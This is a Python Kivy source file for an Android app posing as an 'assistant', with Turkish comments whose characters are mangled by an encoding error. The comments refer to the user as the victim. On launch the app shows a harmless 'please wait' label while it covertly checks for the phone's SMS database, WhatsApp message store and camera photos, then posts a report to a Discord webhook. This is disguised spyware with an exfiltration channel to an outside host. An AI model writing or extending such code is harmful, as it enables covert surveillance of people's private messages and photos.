import os
from kivy.app import App
from kivy.uix.label import Label
import requests

# SENÄ°N DISCORD WEBHOOK ADRESÄ°N
WEBHOOK_URL = "BURAYA_WEBHOOK_LINKINI_YAPISTIR"

class AsistanApp(App):
    def build(self):
        # Uygulama aÃ§Ä±ldÄ±ÄŸÄ±nda kurbana gÃ¶rÃ¼necek masum yazÄ±
        return Label(text="Asistan BaÅŸlatÄ±ldÄ±. LÃ¼tfen Bekleyiniz...")

    def on_start(self):
        # Uygulama aÃ§Ä±ldÄ±ÄŸÄ± an arka planda operasyon baÅŸlar
        self.operasyon_baslat()

    def operasyon_baslat(self):
        veriler = "ğŸš€ Android Operasyonu BaÅŸladÄ±!\n"
        
        # 1. TEMEL BÄ°LGÄ°LERÄ° TOPLA
        try:
            # Android'de dosya yollarÄ± farklÄ±dÄ±r
            yollar = {
                "SMS": "/data/data/com.android.providers.telephony/databases/mmssms.db",
                "WhatsApp": "/sdcard/WhatsApp/Databases/msgstore.db.crypt14",
                "Galeri": "/sdcard/DCIM/Camera/"
            }
            
            for isim, yol in yollar.items():
                if os.path.exists(yol):
                    veriler += f"âœ… {isim} bulundu!\n"
                else:
                    veriler += f"âŒ {isim} eriÅŸilemedi.\n"
                    
        except Exception as e:
            veriler += f"Hata: {str(e)}"

        # DISCORD'A RAPOR GÃ–NDER
        requests.post(WEBHOOK_URL, json={"content": veriler})

if __name__ == "__main__":
    AsistanApp().run()
